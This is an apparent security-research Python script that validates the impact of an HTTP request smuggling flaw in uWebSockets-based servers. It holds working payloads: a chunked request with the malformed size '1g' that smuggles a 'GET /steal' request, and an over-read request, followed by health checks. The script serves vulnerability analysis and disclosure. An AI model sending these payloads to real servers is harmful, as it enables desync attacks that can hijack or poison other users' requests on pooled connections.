#!/usr/bin/env python3
# validate_c_impact.py — does the chunked 'g'=16 (F1) over-read cause a real DoS or a crash?
#
# Sends, straight at a target HTTP server (NO proxy), on separate connections:
#   T1  the exact case-C smuggling payload (chunked size line "1g", g accepted as hex 16)
#   T3  an aggressive over-read: declare a 32-byte chunk ("1g") but send only 4 bytes, then EOF
#   T2  a burst of normal requests AFTER the attack, to check the server is still serving
#
# Interpretation:
#   - If C were a real crash / server-wide DoS, T2 would fail (server dead / not serving).
#   - Observed on uWebSockets / uWebSockets.js / hyper-express: T2 = 8/8 served, and the
#     server process stays alive (check its PID with `kill -0` alongside this).
#   => C is a CONNECTION-SCOPED desync, NOT a crash and NOT a server-wide DoS. The over-read is
#      bounded by uSockets' padded recv buffer (no out-of-bounds read); on short data the streaming
#      parser waits for more or aborts cleanly on EOF (T3 returns no response, no segfault).
#      The real impact lands only on a victim sharing a POOLED back-end connection (see
#      ../ECOSYSTEM-IMPACT.md § "Validated impact of C").
#
# Usage:  python3 validate_c_impact.py [host] [port]      (default 127.0.0.1 9001)
# Exit:   0 if the server stayed fully available (8/8), 1 if it degraded.
import socket, sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 9001
CRLF = "\r\n"
smug = "GET /steal HTTP/1.1" + CRLF + "X-Smuggled: "
cpayload = ("POST /echo HTTP/1.1" + CRLF + "Host: t" + CRLF +
            "Transfer-Encoding: chunked" + CRLF + CRLF +
            "1g" + CRLF + smug + CRLF + "0" + CRLF + CRLF).encode()
overread = ("POST /echo HTTP/1.1" + CRLF + "Host: t" + CRLF +
            "Transfer-Encoding: chunked" + CRLF + CRLF + "1g" + CRLF + "AAAA").encode()


def send_recv(raw, timeout=2.5):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except Exception as e:
        return f"<connect failed: {e}>"
    try:
        s.sendall(raw)
    except Exception as e:
        s.close()
        return f"<send failed: {e}>"
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            b = s.recv(4096)
            if not b:
                break
            data += b
            if len(data) > 16384:
                break
    except socket.timeout:
        pass
    except Exception as e:
        data += f"<recv err {e}>".encode()
    s.close()
    return data.split(b"\r\n", 1)[0].decode(errors="replace") if data else "<empty / no response>"


print(f"validate_c_impact -> {host}:{port}")
print(f"  T1 direct case-C response line       : {send_recv(cpayload)}")
print(f"  T3 over-read(declare 32, send 4, EOF): {send_recv(overread)}")
ok, n = 0, 8
for _ in range(n):
    if "200" in send_recv(b"GET /health HTTP/1.1\r\nHost: t\r\n\r\n"):
        ok += 1
verdict = "server-wide OK (no crash / no server DoS)" if ok == n else "DEGRADED — investigate"
print(f"  T2 fresh requests served AFTER attack: {ok}/{n}  -> {verdict}")
sys.exit(0 if ok == n else 1)
